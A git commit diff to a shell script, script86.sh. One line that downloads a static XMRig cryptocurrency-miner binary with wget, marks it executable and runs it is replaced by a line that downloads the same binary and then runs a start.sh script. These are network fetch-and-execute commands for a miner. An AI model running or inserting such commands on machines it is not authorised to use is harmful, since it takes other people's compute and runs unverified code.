60cd73981581ca87a4ab74c0cbb57c4a5e3bf290
Luisbuttocks <costomf00.04@gmail.com>
2026-01-29 13:24:33 +0530

    Update script86.sh

--- script86.sh
+++ script86.sh
@@ -1,2 +1,3 @@
-wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static && chmod +x xmrig-x86_64-static && ./xmrig-x86_64-static -c Config86.json --threads=3
+wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static && chmod +x xmrig-x86_64-static && chmod +x start.sh && ./start.sh
+
 
